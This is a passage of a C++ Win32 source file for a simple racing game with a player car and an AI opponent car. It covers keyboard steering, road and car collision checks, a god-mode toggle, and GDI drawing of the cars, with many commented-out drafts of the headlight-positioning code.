float aiAngle = -PI / 2;  // Add this line
int aiSpeedX = 0;
int aiSpeedY = 0;
int speed = 5;
int aiSpeed = 5;
int timer = TIMER;
int playerTyre1X = playerX + 10;
int playerTyre1Y = playerY + CAR_HEIGHT - TYRE_SIZE;
int playerTyre2X = playerX + CAR_WIDTH - TYRE_SIZE - 10;
int playerTyre2Y = playerY + CAR_HEIGHT - TYRE_SIZE;
int aiTyre1X = aiX + 10;
int aiTyre1Y = aiY + CAR_HEIGHT - TYRE_SIZE;
int aiTyre2X = aiX + CAR_WIDTH - TYRE_SIZE - 10;
int aiTyre2Y = aiY + CAR_HEIGHT - TYRE_SIZE;
float playerAngle = -PI / 2;  // Initialize to face North by default
//float playerAngle = 0.0f;

bool gameStarted = false;
bool gameOver = false;
bool playerWon = false;
bool godMode = true;
//int timer = 30 * 10; // 30 seconds * 10 (timer resolution)

// Window Procedure
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        SetTimer(hWnd, 1, 1000 / FPS, NULL);
        break;
    case WM_TIMER:
        if (timer > 0)
        {
            timer--;
            InvalidateRect(hWnd, NULL, FALSE);
        }
        else if (!gameStarted)
        {
            gameStarted = true;
            srand((unsigned int)time(0));
            aiSpeed = rand() % 5 + 3;

            // Set initial positions for both cars on the lower left road, facing up
            playerX = ROAD_WIDTH / 2 - CAR_WIDTH / 2;
            playerY = HEIGHT - CAR_HEIGHT - 20;
            //playerAngle = -PI / 2; // -90 degrees, pointing straight up
            playerAngle = 0; // 0 degrees, pointing straight up (north)

            aiX = ROAD_WIDTH / 2 - CAR_WIDTH / 2;
            aiY = HEIGHT - CAR_HEIGHT - 100;
            //aiAngle = -PI / 2; // -90 degrees, pointing north
            aiAngle = 0; // 0 degrees, pointing north
        }
        else if (!gameOver)
        {
            // Add God Mode toggle
            if (GetAsyncKeyState('G') & 1) // Check if G key was just pressed
            {
                godMode = !godMode;
            }

            // Store previous position for collision recovery
            float prevPlayerX = playerX;
            float prevPlayerY = playerY;
            float prevPlayerAngle = playerAngle;

            // Player car controls
            if (GetAsyncKeyState(VK_LEFT))
            {
                if (GetAsyncKeyState(VK_DOWN))
                    playerAngle += 0.05f; // Reverse turning
                else
                    playerAngle -= 0.05f; // Forward turning
            }
            if (GetAsyncKeyState(VK_RIGHT))
            {
                if (GetAsyncKeyState(VK_DOWN))
                    playerAngle -= 0.05f; // Reverse turning
                else
                    playerAngle += 0.05f; // Forward turning
            }

            // Forward/Backward movement in the direction the car is facing
            if (GetAsyncKeyState(VK_UP))
            {
                // Move forward in the direction of playerAngle
                playerX += sin(playerAngle) * speed;
                playerY -= cos(playerAngle) * speed;
            }
            if (GetAsyncKeyState(VK_DOWN))
            {
                // Move backward in the opposite direction of playerAngle
                playerX -= sin(playerAngle) * speed;
                playerY += cos(playerAngle) * speed;
            }

            // Update player headlights position based on car angle
            playerTyre1X = playerX + 10;
            playerTyre1Y = playerY + 5;
            playerTyre2X = playerX + CAR_WIDTH - TYRE_SIZE - 10;
            playerTyre2Y = playerY + 5;

            // Road collision detection for player
            bool onRoad = false;
            // Vertical road
            if (playerX >= 0 && playerX <= ROAD_WIDTH - CAR_WIDTH)
                onRoad = true;
            // Horizontal road at top (twice as tall)
            if (playerY >= 0 && playerY <= (ROAD_WIDTH * 2) &&
                playerX >= 0 && playerX <= WIDTH - CAR_WIDTH)
                onRoad = true;

            if (!onRoad && !godMode) // Only restrict movement if god mode is off
            {
                // Return to previous position if off road
                playerX = prevPlayerX;
                playerY = prevPlayerY;
                playerAngle = prevPlayerAngle;
            }

            // AI car movement logic
            if (aiY > ROAD_WIDTH * 2 && aiX < ROAD_WIDTH / 2)
            {
                aiSpeedX = 0;
                aiSpeedY = -aiSpeed;
                aiAngle = 0;  // Facing upward
            }
            else if (aiY <= ROAD_WIDTH * 2 && aiX < WIDTH - ROAD_WIDTH)
            {
                aiSpeedX = aiSpeed;
                aiSpeedY = 0;
                aiAngle = -PI / 2;  // Facing right
            }
            else if (aiX >= WIDTH - ROAD_WIDTH && aiY <= HEIGHT - ROAD_WIDTH)
            {
                aiSpeedX = 0;
                aiSpeedY = aiSpeed;
                aiAngle = PI;  // Facing downward
            }
            else if (aiX > ROAD_WIDTH && aiY >= HEIGHT - ROAD_WIDTH)
            {
                aiSpeedX = -aiSpeed;
                aiSpeedY = 0;
                aiAngle = PI / 2;  // Facing left
            }

            // AI Car Movement and Headlight Update
            aiX += aiSpeedX;
            aiY += aiSpeedY;

            // Calculate the front of the car using its angle
            float headlightDistance = CAR_HEIGHT / 2 - 10;

            // Calculate headlight positions based on the car's angle
            float headlightOffsetX = cos(aiAngle) * headlightDistance;
            float headlightOffsetY = sin(aiAngle) * headlightDistance;

            // Set AI headlights at the front of the car
            //aiTyre1X = aiX + CAR_WIDTH / 4 + headlightOffsetX;
            //aiTyre1Y = aiY + headlightOffsetY;
            //aiTyre2X = aiX - CAR_WIDTH / 4 + headlightOffsetX;
            //aiTyre2Y = aiY + headlightOffsetY;

            // Collision detection between player and AI cars            
            // Define the corners of the player car
            int playerCorner1X = playerX;
            int playerCorner1Y = playerY;
            int playerCorner2X = playerX + CAR_WIDTH;
            int playerCorner2Y = playerY;
            int playerCorner3X = playerX + CAR_WIDTH;
            int playerCorner3Y = playerY + CAR_HEIGHT;
            int playerCorner4X = playerX;
            int playerCorner4Y = playerY + CAR_HEIGHT;

            // Define the corners of the AI car
            int aiCorner1X = aiX;
            int aiCorner1Y = aiY;
            int aiCorner2X = aiX + CAR_WIDTH;
            int aiCorner2Y = aiY;
            int aiCorner3X = aiX + CAR_WIDTH;
            int aiCorner3Y = aiY + CAR_HEIGHT;
            int aiCorner4X = aiX;
            int aiCorner4Y = aiY + CAR_HEIGHT;

            // Check if the player car is too close to the opponent car from behind
            if (!godMode && playerY + CAR_HEIGHT > aiY &&
                playerY < aiY + CAR_HEIGHT &&
                playerX + CAR_WIDTH > aiX &&
                playerX < aiX + CAR_WIDTH)
            {
                // Prevent the player car from moving forward
                if (GetAsyncKeyState(VK_UP))
                {
                    playerX -= sin(playerAngle) * speed;
                    playerY += cos(playerAngle) * speed;
                }
            }

            // Check if any of the player car's corners are inside the AI car
            if (!godMode && ((playerCorner1X > aiCorner1X && playerCorner1X < aiCorner3X &&
                playerCorner1Y > aiCorner1Y && playerCorner1Y < aiCorner3Y) ||
                (playerCorner2X > aiCorner1X && playerCorner2X < aiCorner3X &&
                    playerCorner2Y > aiCorner1Y && playerCorner2Y < aiCorner3Y) ||
                (playerCorner3X > aiCorner1X && playerCorner3X < aiCorner3X &&
                    playerCorner3Y > aiCorner1Y && playerCorner3Y < aiCorner3Y) ||
                (playerCorner4X > aiCorner1X && playerCorner4X < aiCorner3X &&
                    playerCorner4Y > aiCorner1Y && playerCorner4Y < aiCorner3Y) ||
                // Check if any of the AI car's corners are inside the player car
                (aiCorner1X > playerCorner1X && aiCorner1X < playerCorner3X &&
                    aiCorner1Y > playerCorner1Y && aiCorner1Y < playerCorner3Y) ||
                (aiCorner2X > playerCorner1X && aiCorner2X < playerCorner3X &&
                    aiCorner2Y > playerCorner1Y && aiCorner2Y < playerCorner3Y) ||
                (aiCorner3X > playerCorner1X && aiCorner3X < playerCorner3X &&
                    aiCorner3Y > playerCorner1Y && aiCorner3Y < playerCorner3Y) ||
                (aiCorner4X > playerCorner1X && aiCorner4X < playerCorner3X &&
                    aiCorner4Y > playerCorner1Y && aiCorner4Y < playerCorner3Y)))
            {
                // Move the player car back to prevent collision
                if (GetAsyncKeyState(VK_UP))
                {
                    playerX -= sin(playerAngle) * speed;
                    playerY += cos(playerAngle) * speed;
                }
                if (GetAsyncKeyState(VK_DOWN))
                {
                    playerX += sin(playerAngle) * speed;
                    playerY -= cos(playerAngle) * speed;
                }

                // Move the AI car back to prevent collision
                aiX -= aiSpeedX;
                aiY -= aiSpeedY;
            }

            /* Victory conditions commented out
            if (playerX > WIDTH - ROAD_WIDTH - CAR_WIDTH && playerY < ROAD_WIDTH)
            {
                gameOver = true;
                playerWon = true;
            }
            if (aiX > WIDTH - ROAD_WIDTH - CAR_WIDTH && aiY < Road_WIDTH)
            {
                gameOver = true;
                playerWon = false;
            }
            */

            InvalidateRect(hWnd, NULL, FALSE);
        }
        break;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);

        // Create memory DC and bitmap for double buffering
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP memBitmap = CreateCompatibleBitmap(hdc, WIDTH, HEIGHT);
        HBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, memBitmap);

        // Clear background
        HBRUSH lightGreenBrush = CreateSolidBrush(RGB(144, 238, 144)); // Light green color
        RECT rect = { 0, 0, WIDTH, HEIGHT };
        FillRect(memDC, &rect, lightGreenBrush);
        DeleteObject(lightGreenBrush);

        // Draw roads (black rectangles)
        HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
        // Vertical road
        RECT verticalRoad = { 0, 0, ROAD_WIDTH, HEIGHT };
        FillRect(memDC, &verticalRoad, blackBrush);
        // Horizontal road (twice as tall)
        RECT horizontalRoad = { 0, 0, WIDTH, ROAD_WIDTH * 2 };
        FillRect(memDC, &horizontalRoad, blackBrush);
        DeleteObject(blackBrush);

        // Draw yellow road strips
        HBRUSH yellowBrush = CreateSolidBrush(RGB(255, 255, 0));
        SelectObject(memDC, yellowBrush);
        // Vertical road strips
        for (int y = 0; y < HEIGHT; y += 80) {
            Rectangle(memDC, ROAD_WIDTH / 2 - 5, y, ROAD_WIDTH / 2 + 5, y + 40);
        }
        // Horizontal road strips
        for (int x = 0; x < WIDTH; x += 80) {
            Rectangle(memDC, x, ROAD_WIDTH - 5, x + 40, ROAD_WIDTH + 5);
        }
        DeleteObject(yellowBrush);

        // Drawing Player's Car and Headlights
        HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
        SelectObject(memDC, redBrush);
        int savedDC = SaveDC(memDC);
        XFORM xform;
        SetGraphicsMode(memDC, GM_ADVANCED);
        xform.eM11 = (FLOAT)cos(playerAngle);
        xform.eM12 = (FLOAT)sin(playerAngle);
        xform.eM21 = (FLOAT)-sin(playerAngle);
        xform.eM22 = (FLOAT)cos(playerAngle);
        xform.eDx = (FLOAT)playerX + CAR_WIDTH / 2;
        xform.eDy = (FLOAT)playerY + CAR_HEIGHT / 2;
        SetWorldTransform(memDC, &xform);
        Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);

        //headlights yellow (player)
        SelectObject(memDC, CreateSolidBrush(RGB(255, 255, 0)));
        Rectangle(memDC, -CAR_WIDTH / 2 + 2, -CAR_HEIGHT / 2 + 2, -CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 6);
        Rectangle(memDC, CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 2, CAR_WIDTH / 2 - 2, -CAR_HEIGHT / 2 + 6);

        HBRUSH headlightBrush = CreateSolidBrush(RGB(255, 255, 255));
        SelectObject(memDC, headlightBrush);
        // Consistent headlight offset, relative to the car's dimensions
        int headlightSize = 10;
        int playerheadlightOffsetX = 10;
        int playerheadlightOffsetY = -CAR_HEIGHT / 2 + 15;  // Adjusted vertical offset
        Ellipse(memDC, -CAR_WIDTH / 2 + playerheadlightOffsetX, playerheadlightOffsetY,
            -CAR_WIDTH / 2 + playerheadlightOffsetX + headlightSize, playerheadlightOffsetY + headlightSize);
        Ellipse(memDC, CAR_WIDTH / 2 - playerheadlightOffsetX - headlightSize, playerheadlightOffsetY,
            CAR_WIDTH / 2 - playerheadlightOffsetX, playerheadlightOffsetY + headlightSize);
        DeleteObject(headlightBrush);
        
//start
        int wsY = -CAR_HEIGHT / 2 + int(0.38f * CAR_HEIGHT);
        int wsH = CAR_HEIGHT / 6;
        int wsW = int(CAR_WIDTH * 0.7f);

        HBRUSH hWin = CreateSolidBrush(RGB(0, 0, 0));
        SelectObject(memDC, hWin);

        Rectangle(memDC,
            -wsW / 2, wsY,
            wsW / 2, wsY + wsH
        );

//start sidewindow
        int stripW = max(2, CAR_WIDTH / 20);
        int stripH = wsH * 2;

        Rectangle(memDC,
            -wsW / 2 - stripW,
            wsY,
            -wsW / 2,
            wsY + stripH
        );

        Rectangle(memDC,
            wsW / 2,
            wsY,
            wsW / 2 + stripW,
            wsY + stripH
        );
//end sidewindow

        int sideW = CAR_WIDTH / 8;
        Rectangle(memDC,
            -CAR_WIDTH / 2 + 5, wsY,
            -CAR_WIDTH / 2 + 5 + sideW, wsY + wsH
        );
        Rectangle(memDC,
            CAR_WIDTH / 2 - 5 - sideW, wsY,
            CAR_WIDTH / 2 - 5, wsY + wsH
        );

        DeleteObject(hWin);

        HBRUSH hTy = CreateSolidBrush(RGB(0, 0, 0));
        SelectObject(memDC, hTy);
        int t = TYRE_SIZE;

        int fy = -CAR_HEIGHT / 2 + 5;
        Rectangle(memDC, -CAR_WIDTH / 2, fy, -CAR_WIDTH / 2 + t, fy + t);
        Rectangle(memDC, CAR_WIDTH / 2 - t, fy, CAR_WIDTH / 2, fy + t);

        int ry = CAR_HEIGHT / 2 - t - 5;
        Rectangle(memDC, -CAR_WIDTH / 2, ry, -CAR_WIDTH / 2 + t, ry + t);
        Rectangle(memDC, CAR_WIDTH / 2 - t, ry, CAR_WIDTH / 2, ry + t);

        DeleteObject(hTy);

//ends

        
        RestoreDC(memDC, savedDC);
        DeleteObject(redBrush);

        // Draw AI car (blue rectangle)
        // AI Car Rendering
        // Drawing AI's Car and Headlights
                    // Draw AI car (blue rectangle)
        // AI Car Rendering
        // AI Car Rendering
        //O3's fix working best inconsistent padded positioning tho
            // Draw AI car (blue rectangle)
        // ----- Draw AI Car (blue rectangle) with rotated transform -----
        HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
        SelectObject(memDC, blueBrush);
        int savedDC2 = SaveDC(memDC);  // Save state using a unique variable name
        SetGraphicsMode(memDC, GM_ADVANCED);
        XFORM xform2;
        xform2.eM11 = (FLOAT)cos(aiAngle);
        xform2.eM12 = (FLOAT)sin(aiAngle);


        xform2.eM21 = (FLOAT)-sin(aiAngle);
        xform2.eM22 = (FLOAT)cos(aiAngle);
        xform2.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
        xform2.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
        SetWorldTransform(memDC, &xform2);
        Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);
        RestoreDC(memDC, savedDC2);
        DeleteObject(blueBrush);

        // ----- Dynamic AI Headlight Positioning -----
        //
        // This solution computes the AI car's nose (front) using its center (cx,cy)
        // and a front vector derived from aiAngle. Note that the ""front distance"" is
        // CAR_HEIGHT/2 when facing up/down (aiAngle == 0 or PI) and CAR_WIDTH/2 when
        // facing right/left (aiAngle == -PI/2 or PI/2). We then move slightly back from
        // the extreme nose by frontMargin, and offset perpendicular (by aiheadlightSeparation)
        // to get the left and right headlight positions.
        //
        // Define parameters (adjust as needed):
        float cx = aiX + CAR_WIDTH / 2.0f;
        float cy = aiY + CAR_HEIGHT / 2.0f;
        float frontMargin = 5.0f;            // Moves headlights slightly inward from the nose
        float aiheadlightSeparation = 10.0f;   // Lateral offset from the nose for each headlight
        int aiheadlightSize = 8;             // Size of the headlight circle

        // Determine the front distance depending on orientation:
        float frontDistance;
        if (aiAngle == 0 || aiAngle == PI)
            frontDistance = CAR_HEIGHT / 2.0f;
        else // aiAngle == -PI/2 or PI/2
            frontDistance = CAR_WIDTH / 2.0f;

        // The default car drawing uses a local coordinate system where the car's nose is at (0, -1)
        // i.e. at (0, -frontDistance). Thus the front vector (rotated) is:
        float noseX = cx + (-sin(aiAngle)) * frontDistance;
        float noseY = cy + (-cos(aiAngle)) * frontDistance;

        // Pull the headlight positions slightly back from the extreme nose using frontMargin:
        float effectiveX = cx + (-sin(aiAngle)) * (frontDistance - frontMargin);
        float effectiveY = cy + (-cos(aiAngle)) * (frontDistance - frontMargin);

        // Compute a perpendicular vector to the front. For a front vector f = (-sin(aiAngle), -cos(aiAngle)),
        // a perpendicular is p = (cos(aiAngle), -sin(aiAngle)). (We use -p for the left headlight.)
        float px = cos(aiAngle);
        float py = -sin(aiAngle);

        // Compute left and right headlight positions by offsetting perpendicular to the front:
        float leftHeadlightX = effectiveX - px * aiheadlightSeparation;
        float leftHeadlightY = effectiveY - py * aiheadlightSeparation;

        float rightHeadlightX = effectiveX + px * aiheadlightSeparation;
        float rightHeadlightY = effectiveY + py * aiheadlightSeparation;

        // Draw the AI headlights using the computed world coordinates:
        HBRUSH aiHeadlightBrush = CreateSolidBrush(RGB(255, 255, 255));
        SelectObject(memDC, aiHeadlightBrush);
        Ellipse(memDC, (int)leftHeadlightX, (int)leftHeadlightY,
            (int)(leftHeadlightX + aiheadlightSize), (int)(leftHeadlightY + aiheadlightSize));
        Ellipse(memDC, (int)rightHeadlightX, (int)rightHeadlightY,
            (int)(rightHeadlightX + aiheadlightSize), (int)(rightHeadlightY + aiheadlightSize));
        DeleteObject(aiHeadlightBrush);

        //voila! It's working perfectly /w the following dynamic code!!!
        // ----- Draw AI Car (blue rectangle) with rotated transform -----
        { //revert to..
            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
            SelectObject(memDC, blueBrush);
            int savedDC2 = SaveDC(memDC);  // Save current DC state
            SetGraphicsMode(memDC, GM_ADVANCED);
            XFORM xform2;
            xform2.eM11 = (FLOAT)cos(aiAngle);
            xform2.eM12 = (FLOAT)sin(aiAngle);
            xform2.eM21 = (FLOAT)-sin(aiAngle);
            xform2.eM22 = (FLOAT)cos(aiAngle);
            xform2.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
            xform2.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
            SetWorldTransform(memDC, &xform2);
            Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);
            

            /*HBRUSH hlBrush = CreateSolidBrush(RGB(255, 255, 255));
            SelectObject(memDC, hlBrush);
            int hlSize = 8;
            int hlOffset = -CAR_HEIGHT / 2 + 5;

            Ellipse(memDC,
                -CAR_WIDTH / 4 - hlSize / 2, hlOffset,
                -CAR_WIDTH / 4 + hlSize / 2, hlOffset + hlSize
            );

            Ellipse(memDC,
                +CAR_WIDTH / 4 - hlSize / 2, hlOffset,
                +CAR_WIDTH / 4 + hlSize / 2, hlOffset + hlSize
            );
            DeleteObject(hlBrush);*/

            //revert to ..

/*                //headlights yellow (AI)
            SelectObject(memDC, CreateSolidBrush(RGB(255, 255, 0)));
            Rectangle(memDC, -CAR_WIDTH / 2 + 2, -CAR_HEIGHT / 2 + 2, -CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 6);
            Rectangle(memDC, CAR_WIDTH / 4, -CAR_HEIGHT / 2 + 2, CAR_WIDTH / 2 - 2, -CAR_HEIGHT / 2 + 6);
            */

            HBRUSH winB = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(memDC, winB);

            int wsY = -CAR_HEIGHT / 2 + int(0.38f * CAR_HEIGHT);
            int wsH = CAR_HEIGHT / 6;
            int wsW = int(CAR_WIDTH * 0.7f);

            Rectangle(memDC,
                -wsW / 2, wsY,
                wsW / 2, wsY + wsH
            );

            int stripW = max(2, CAR_WIDTH / 20);
            int stripH = wsH * 2;
            Rectangle(memDC,
                -wsW / 2 - stripW, wsY,
                -wsW / 2, wsY + stripH
            );
            Rectangle(memDC,
                +wsW / 2, wsY,
                +wsW / 2 + stripW, wsY + stripH
            );
            DeleteObject(winB);


            HBRUSH tyB = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(memDC, tyB);
            int t = TYRE_SIZE;

            int fy = -CAR_HEIGHT / 2 + 5;
            Rectangle(memDC, -CAR_WIDTH / 2, fy, -CAR_WIDTH / 2 + t, fy + t);
            Rectangle(memDC, +CAR_WIDTH / 2 - t, fy, +CAR_WIDTH / 2, fy + t);

            int ry = +CAR_HEIGHT / 2 - t - 5;
            Rectangle(memDC, -CAR_WIDTH / 2, ry, -CAR_WIDTH / 2 + t, ry + t);
            Rectangle(memDC, +CAR_WIDTH / 2 - t, ry, +CAR_WIDTH / 2, ry + t);
            DeleteObject(tyB);


            /*const float  frontFrac = 0.38f;
            int    wsY = int(-CAR_HEIGHT / 2 + frontFrac * CAR_HEIGHT);
            int    wsH = CAR_HEIGHT / 6;
            int    wsW = int(CAR_WIDTH * 0.7f);
            HBRUSH winBrush = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(memDC, winBrush);

            Rectangle(memDC,
                -wsW / 2, wsY,
                wsW / 2, wsY + wsH
            );

            int stripW = max(2, CAR_WIDTH / 20);
            int stripH = wsH * 2;

            Rectangle(memDC,
                -wsW / 2 - stripW, wsY,
                -wsW / 2, wsY + stripH
            );

            Rectangle(memDC,
                +wsW / 2, wsY,
                +wsW / 2 + stripW, wsY + stripH
            );
            DeleteObject(winBrush);


            HBRUSH tyBrush = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(memDC, tyBrush);
            int t = TYRE_SIZE;

            int fy = -CAR_HEIGHT / 2 + 5;
            Rectangle(memDC, -CAR_WIDTH / 2, fy, -CAR_WIDTH / 2 + t, fy + t);
            Rectangle(memDC, +CAR_WIDTH / 2 - t, fy, CAR_WIDTH / 2, fy + t);

            int ry = +CAR_HEIGHT / 2 - t - 5;
            Rectangle(memDC, -CAR_WIDTH / 2, ry, -CAR_WIDTH / 2 + t, ry + t);
            Rectangle(memDC, +CAR_WIDTH / 2 - t, ry, CAR_WIDTH / 2, ry + t);
            DeleteObject(tyBrush); */


            /*
            //start
            int wsY = -CAR_HEIGHT / 2 + int(0.38f * CAR_HEIGHT);
            int wsH = CAR_HEIGHT / 6;
            int wsW = int(CAR_WIDTH * 0.7f);

            HBRUSH hWin = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(memDC, hWin);

            Rectangle(memDC,
                -wsW / 2, wsY,
                wsW / 2, wsY + wsH
            );

            //start sidewindow
            int stripW = max(2, CAR_WIDTH / 20);
            int stripH = wsH * 2;

            Rectangle(memDC,
                -wsW / 2 - stripW,
                wsY,
                -wsW / 2,
                wsY + stripH
            );

            Rectangle(memDC,
                wsW / 2,
                wsY,
                wsW / 2 + stripW,
                wsY + stripH
            );
            //end sidewindow
            */
            /*
            int sideW = CAR_WIDTH / 8;
            Rectangle(memDC,
                -CAR_WIDTH / 2 + 5, wsY,
                -CAR_WIDTH / 2 + 5 + sideW, wsY + wsH
            );
            Rectangle(memDC,
                CAR_WIDTH / 2 - 5 - sideW, wsY,
                CAR_WIDTH / 2 - 5, wsY + wsH
            );
*/
            /*
            DeleteObject(hWin);

            HBRUSH hTy = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(memDC, hTy);
            int t = TYRE_SIZE;

            int fy = -CAR_HEIGHT / 2 + 5;
            Rectangle(memDC, -CAR_WIDTH / 2, fy, -CAR_WIDTH / 2 + t, fy + t);
            Rectangle(memDC, CAR_WIDTH / 2 - t, fy, CAR_WIDTH / 2, fy + t);

            int ry = CAR_HEIGHT / 2 - t - 5;
            Rectangle(memDC, -CAR_WIDTH / 2, ry, -CAR_WIDTH / 2 + t, ry + t);
            Rectangle(memDC, CAR_WIDTH / 2 - t, ry, CAR_WIDTH / 2, ry + t);

            DeleteObject(hTy);
            //ends */

            RestoreDC(memDC, savedDC2);
            DeleteObject(blueBrush);
        }

            /*{
            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
            SelectObject(memDC, blueBrush);

            int savedDC2 = SaveDC(memDC);
            SetGraphicsMode(memDC, GM_ADVANCED);

            XFORM xform2;
            xform2.eM11 = (FLOAT)cos(aiAngle);
            xform2.eM12 = (FLOAT)sin(aiAngle);
            xform2.eM21 = (FLOAT)-sin(aiAngle);
            xform2.eM22 = (FLOAT)cos(aiAngle);
            xform2.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
            xform2.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
            SetWorldTransform(memDC, &xform2);

            Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);

            {
                HBRUSH hlBrush = CreateSolidBrush(RGB(255, 255, 255));
                SelectObject(memDC, hlBrush);
                int hlSize = 8;
                int hlOffset = -CAR_HEIGHT / 2 + 5;

                Ellipse(memDC,
                    -CAR_WIDTH / 4 - hlSize / 2, hlOffset,
                    -CAR_WIDTH / 4 + hlSize / 2, hlOffset + hlSize
                );

                Ellipse(memDC,
                    +CAR_WIDTH / 4 - hlSize / 2, hlOffset,
                    +CAR_WIDTH / 4 + hlSize / 2, hlOffset + hlSize
                );
                DeleteObject(hlBrush);
            }

            {
                HBRUSH winBrush = CreateSolidBrush(RGB(0, 0, 0));
                SelectObject(memDC, winBrush);

                int wsY = -CAR_HEIGHT / 2 + int(0.38f * CAR_HEIGHT);
                int wsH = CAR_HEIGHT / 6;
                int wsW = int(CAR_WIDTH * 0.7f);

                Rectangle(memDC,
                    -wsW / 2, wsY,
                    wsW / 2, wsY + wsH
                );

                int stripW = max(2, CAR_WIDTH / 20);
                int stripH = wsH * 2;

                Rectangle(memDC,
                    -wsW / 2 - stripW, wsY,
                    -wsW / 2, wsY + stripH
                );

                Rectangle(memDC,
                    +wsW / 2, wsY,
                    +wsW / 2 + stripW, wsY + stripH
                );

                DeleteObject(winBrush);
            }

            {
                HBRUSH tyBrush = CreateSolidBrush(RGB(0, 0, 0));
                SelectObject(memDC, tyBrush);

                int t = TYRE_SIZE;

                int fy = -CAR_HEIGHT / 2 + 5;
                Rectangle(memDC, -CAR_WIDTH / 2, fy, -CAR_WIDTH / 2 + t, fy + t);
                Rectangle(memDC, +CAR_WIDTH / 2 - t, fy, +CAR_WIDTH / 2, fy + t);

                int ry = +CAR_HEIGHT / 2 - t - 5;
                Rectangle(memDC, -CAR_WIDTH / 2, ry, -CAR_WIDTH / 2 + t, ry + t);
                Rectangle(memDC, +CAR_WIDTH / 2 - t, ry, +CAR_WIDTH / 2, ry + t);

                DeleteObject(tyBrush);
            }

            RestoreDC(memDC, savedDC2);
            DeleteObject(blueBrush);
            }*/


        // ----- Dynamically Compute and Draw AI Headlights -----
        //
        // This solution calculates the headlight positions based on the car�s center,
        // a �front� vector (pointing toward the nose) and a perpendicular vector for lateral offset.
        // The idea is that the headlights are placed at a fixed distance (headlightDistance)
        // from the center along the front vector (which is always the nose direction)
        // and then offset left/right by aiheadlightSeparation.
        /*{ //revert to..
            // Car center
            float cx = aiX + CAR_WIDTH / 2.0f;
            float cy = aiY + CAR_HEIGHT / 2.0f;

            // Parameters � adjust these to fine-tune the look:
            // We use CAR_HEIGHT/2 as the full distance from center to nose when facing up.
            // To mimic the player car�s appearance (headlights slightly inset from the very front),
            // we subtract 15 pixels.
            float headlightDistance = CAR_HEIGHT / 2.0f - 15.0f;
            float aiheadlightSeparation = 10.0f;  // Lateral offset from the center of the nose
            int aiheadlightSize = 8;              // Headlight circle size

            // Compute the ""front"" direction vector.
            // Since the car�s default (unrotated) orientation has its nose at the top,
            // the front vector in local coordinates is (0, -1). Rotating that by aiAngle:
            float frontDirX = -sin(aiAngle);
            float frontDirY = -cos(aiAngle);

            // Determine the headlight �center� position � a point along the nose,
            // but moved slightly inward by headlightDistance:
            float headlightCenterX = cx + frontDirX * headlightDistance;
            float headlightCenterY = cy + frontDirY * headlightDistance;

            // Compute a perpendicular vector to the front.
            // A vector perpendicular to (frontDirX, frontDirY) is given by (cos(aiAngle), -sin(aiAngle)).
            float perpX = cos(aiAngle);
            float perpY = -sin(aiAngle);

            // Compute left and right headlight positions by offsetting the headlight center along the perpendicular.
            float leftHeadlightX = headlightCenterX - perpX * aiheadlightSeparation;
            float leftHeadlightY = headlightCenterY - perpY * aiheadlightSeparation;
            float rightHeadlightX = headlightCenterX + perpX * aiheadlightSeparation;
            float rightHeadlightY = headlightCenterY + perpY * aiheadlightSeparation;

            // Draw the AI headlights using the computed world coordinates:
            HBRUSH aiHeadlightBrush = CreateSolidBrush(RGB(255, 255, 255));
            SelectObject(memDC, aiHeadlightBrush);
            Ellipse(memDC, (int)leftHeadlightX, (int)leftHeadlightY,
                (int)(leftHeadlightX + aiheadlightSize), (int)(leftHeadlightY + aiheadlightSize));
            Ellipse(memDC, (int)rightHeadlightX, (int)rightHeadlightY,
                (int)(rightHeadlightX + aiheadlightSize), (int)(rightHeadlightY + aiheadlightSize));
            DeleteObject(aiHeadlightBrush);

        }*/


            {
            float cx = aiX + CAR_WIDTH / 2.0f;
            float cy = aiY + CAR_HEIGHT / 2.0f;

            float frontDirX = -sin(aiAngle);
            float frontDirY = -cos(aiAngle);

            float perpX = cos(aiAngle);
            float perpY = -sin(aiAngle);

            float headlightDistance = CAR_HEIGHT / 2.0f - 15.0f;
            float aiheadlightSeparation = 10.0f;
            int   aiheadlightSize = 8;

            float leftHeadlightX = cx + frontDirX * headlightDistance - perpX * aiheadlightSeparation;
            float leftHeadlightY = cy + frontDirY * headlightDistance - perpY * aiheadlightSeparation;
            float rightHeadlightX = cx + frontDirX * headlightDistance + perpX * aiheadlightSeparation;
            float rightHeadlightY = cy + frontDirY * headlightDistance + perpY * aiheadlightSeparation;

            HBRUSH aiHeadlightBrush = CreateSolidBrush(RGB(255, 255, 255));
            SelectObject(memDC, aiHeadlightBrush);
            Ellipse(memDC,
                (int)leftHeadlightX, (int)leftHeadlightY,
                (int)(leftHeadlightX + aiheadlightSize), (int)(leftHeadlightY + aiheadlightSize)
            );
